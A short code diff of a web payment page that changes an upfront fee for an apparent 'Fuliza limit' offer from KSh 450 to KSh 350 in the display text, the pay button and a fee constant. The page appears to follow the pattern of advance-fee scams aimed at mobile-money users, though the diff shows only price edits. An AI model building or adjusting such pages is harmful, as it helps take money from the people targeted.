@@ -129,7 +129,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
       <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
-        <div class="invoice-amount">450</div>
+        <div class="invoice-amount">350</div>
         <div class="invoice-label">Amount Due</div>
       </div>
     </div>
@@ -168,7 +168,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
     </div>
     <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
 
-    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 450 Now</button>
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 350 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
@@ -232,7 +232,7 @@ const BACKEND = "https://swiftwallet-server.onrender.com";
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 document.getElementById("limit").innerText = selectedAmount;
 
-const TRANSACTION_FEE = 450;
+const TRANSACTION_FEE = 350;
 
 const phoneInput  = document.getElementById("phone");
 const phoneWrap   = document.getElementById("phoneWrap");
